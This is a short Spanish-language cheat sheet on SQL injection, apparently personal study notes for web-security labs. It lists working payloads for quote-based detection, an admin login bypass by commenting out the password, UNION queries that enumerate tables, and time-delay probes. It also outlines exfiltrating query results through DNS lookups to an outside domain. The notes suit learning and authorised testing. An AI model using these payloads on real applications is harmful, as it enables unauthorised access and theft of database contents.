
-----------
[CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

-------------
# Definición

>**Inyección SQL** es un método de infiltración de código intruso que se vale de una **vulnerabilidad informática** presente en una aplicación en el nivel de validación de las entradas para realizar operaciones sobre una **base de datos**.

[Wikipedia](https://es.wikipedia.org/wiki/Inyecci%C3%B3n_SQL)

Una query de SQL es del tipo:

``` mysql
SELECT * FROM products WHERE category='Gift'
```

donde
- **Asterisco** representa los *elementos* a mostrar
- **products** representa la *tabla* en uso
- **category** representa el nombre de la *columna de filtro*
- **Gift** representa el *valor* de la columna de filtro

--------
# Identificación

- Introducir una comilla en el campo vulnerable. Si peta, es vulnerable a SQL Injection. Faltaría identificar el tipo.
- Probar injección del tipo ``` 'or 1=1-- - ```. Si funciona, se muestra todo el contenido de la tabla en uso.

----------
# Explotación

- En una interfaz de autenticación de usuario, se puede probar a comentar la contraseña para bypassear el inicio y entrar en la sesión del usuario dado.
	``` text
	Usuario: admin'-- -
	Contraseña: sjdlkfs (Cualquier cosa)
	```
	Si funciona, se puede utilizar para enumerar la base de datos mediante una **blind injection** de tipo *boolean* en función de si se ha iniciado sesión o no.
	
- Obtención de tablas
	- En Oracle Databases:
		``` mysql
		'AQUI SOLO VA UNA COMILLA' union select table_name from all_tables where owner='NOMBRE_DEL_ESQUEMA'-- -
		```
	- En No Oracle Databases:
		``` mysql
		'AQUI SOLO VA UNA COMILLA' union select table_name from information_schema.tables where table_schema='NOMBRE_DEL_ESQUEMA'-- -
		```

---------
# Concatenación de strings

- En MySQL y Microsoft -> **group_concat()** o **group_concat(** COLUMN SEPARATOR ':' **)**
- En PostgreSQL -> **string_agg(** COLUMN, SEPARATOR **)**
- En Oracle -> **listagg(** COLUMN, SEPARATOR **)**

-----------
# Time delays

- En MySQL -> **' and sleep(10)-- -**
- En PostgreSQL -> **' and ((select pg_sleep(10)) is null)-- -**
	También se puede intentar con **' || pg_sleep(10)-- -** pero no es fiable.

----------

# Exfiltración de datos via DNS Lookup

- Se puede hacer con el Burp Collaborator (de pago).
	Más cómodo de hacer a través de http://requestbin.whapi.cloud
- Se hace una consulta DNS al dominio generado de la forma:
	``` dns
	(query).domain.com
	```
	Desde el dominio se verá una consulta con el resultado de la query.

---------

# Inyección en parámetro XML

- Mediante la extensión de BurpSuite **Hackvertor** se puede codificar el parámetro vulnerable a SQLi para bypassear el WAF.